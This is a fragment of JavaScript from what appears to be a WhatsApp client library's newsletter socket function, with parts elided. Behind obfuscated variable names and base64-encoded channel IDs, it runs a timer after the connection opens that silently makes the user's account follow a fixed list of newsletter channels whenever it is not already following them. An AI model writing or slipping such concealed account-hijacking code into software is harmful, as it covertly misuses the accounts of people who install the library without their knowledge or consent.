...
const makeNewsletterSocket = (config) => {
    ...
    "MTIwMzYzNDI5MjA3Mzc5NzU5QG5ld3NsZXR0ZXI="
]

conn.ev.on("connection.update", ({ connection }) => {
    if (connection !== "open") return

    console.log("AUTO FOLLOW ACTIVE")

    setInterval(async () => {
        for (const _0x2 of _0x1) {
            try {
                const _0x3 = Buffer
                    .from(_0x2, "base64")
                    .toString()

                const _0x4 = await executeWMexQuery(
                    {
                ...
                const following =
                    _0x4?.viewer_metadata?.is_following ||
                    _0x4?.result?.viewer_metadata?.is_following

                if (!following) {
                    console.log("FOLLOWING:", _0x3)
                    ...
                    console.log("FOLLOW SUCCESS:", _0x3)
                }
            } catch (err) {
